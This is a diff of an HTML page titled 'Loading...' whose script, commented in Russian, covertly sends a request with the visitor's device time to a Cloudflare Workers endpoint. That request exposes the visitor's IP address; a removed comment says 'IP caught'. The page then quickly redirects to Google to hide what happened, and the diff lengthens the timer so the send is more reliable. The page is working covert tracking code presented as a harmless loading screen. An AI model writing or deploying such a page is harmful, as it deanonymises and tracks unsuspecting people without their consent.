@@ -1,28 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>Loading...</title>
     <script>
-        const t = encodeURIComponent(new Date().toLocaleString());
+        // Твоя ссылка и текущее время устройства
         const url = "https://adminfdm.alexgranny1708.workers.dev/";
+        const t = encodeURIComponent(new Date().toLocaleString());
 
         const i = new Image();
-        
-        // Функция для ухода в Google
-        function go() {
-            window.location.replace("https://google.com");
-        }
+        function go() { window.location.replace("https://google.com"); }
 
-        // Если картинка загрузилась (IP пойман) — сразу уходим
+        // Если воркер ответил или выдал ошибку — уходим в Google
         i.onload = go;
-        // Если провайдер заблокировал (ошибка) — всё равно уходим
         i.onerror = go;
 
-        // Отправляем запрос
+        // Отправка запроса с данными времени
         i.src = url + "?t=" + t;
 
-        // Жесткий предохранитель на 1.5 секунды (если всё зависло)
-        setTimeout(go, 1500);
+        // Жесткий таймер на 2 секунды для надежности отправки
+        setTimeout(go, 2000);
     </script>
 </head>
 <body>
